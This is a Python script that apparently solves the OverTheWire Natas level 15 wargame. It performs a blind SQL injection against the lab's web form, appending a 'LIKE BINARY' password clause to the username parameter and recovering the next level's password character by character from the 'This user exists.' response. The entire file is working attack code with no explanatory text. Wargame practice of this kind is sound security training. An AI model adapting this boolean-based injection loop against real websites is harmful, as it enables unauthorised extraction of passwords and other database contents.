#!/bin/python
import requests
import string

url = "http://natas15.natas.labs.overthewire.org"
username = "natas15"
password = '' # password for natas15 goes here

q_uname = 'username=natas16"'
q_pw_check = '+and+password+LIKE+BINARY+"'
q_debug_param = '&debug'

pw_chars = []
all_chars = ''.join([string.ascii_letters,string.digits])

hint = "This user exists."

for char in all_chars:
	query = ''.join([url, '?', q_uname, q_pw_check,'%', char, '%', q_debug_param])
	response = requests.get(query, auth=(username, password))
	if hint in response.text:
		pw_chars.append(char)

pw_list = []
pw = ''

for i in range(1,64):
	for char in pw_chars:
		test = ''.join([pw, char])
		query = ''.join([url, '?', q_uname, q_pw_check, test, '%', q_debug_param])
		response = requests.get(query, auth=(username, password))
		if hint in response.text:
			pw_list.append(char)
			pw = ''.join(pw_list)

print("Password:", pw)